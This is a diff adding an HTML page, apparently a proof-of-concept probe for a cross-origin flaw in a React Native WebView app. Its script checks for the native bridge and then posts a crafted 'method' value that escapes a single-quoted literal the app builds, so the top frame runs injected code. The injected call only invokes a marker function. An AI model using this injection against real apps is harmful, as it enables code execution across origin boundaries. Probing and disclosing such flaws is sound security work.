@@ -1,0 +1,47 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>H-1 cross-origin probe</title>
+<style>body{font:13px/1.5 sans-serif;background:#222;color:#fff;margin:0;padding:12px}</style></head>
+<body>
+<b>cross-origin probe frame</b><br>
+<span id="o"></span><br><span id="s">checking...</span>
+<script>
+(function () {
+  var origin = location.origin;
+  var bridge = (typeof window.ReactNativeWebView);
+  var post   = 'n/a';
+  try { post = typeof window.ReactNativeWebView.postMessage; } catch (e) { post = 'throw'; }
+
+  document.getElementById('o').textContent = origin;
+  document.getElementById('s').textContent =
+      'ReactNativeWebView=' + bridge + '  postMessage=' + post;
+
+  // Report upward by ordinary web postMessage, which works cross-origin and
+  // does not depend on the native bridge existing.
+  function tell(stage, extra) {
+    try {
+      parent.postMessage({ xo: true, stage: stage, origin: origin,
+                           bridge: bridge, post: post, extra: extra || null }, '*');
+    } catch (e) {}
+  }
+
+  tell('loaded');
+
+  if (bridge === 'object' && post === 'function') {
+    // Break out of the single quoted literal the app builds around
+    // JSON.stringify(response), then call a function that exists only in the
+    // TOP frame. If it runs, this cross-origin frame executed code in the
+    // top frame's origin.
+    var payload = {
+      id: 'xo-1',
+      method: "xo');window.__h1_proof && window.__h1_proof('" + origin + "');//"
+    };
+    setTimeout(function () {
+      try {
+        window.ReactNativeWebView.postMessage(JSON.stringify(payload));
+        tell('posted');
+      } catch (e) { tell('post-failed', '' + e); }
+    }, 1200);
+  }
+})();
+</script>
+</body></html>
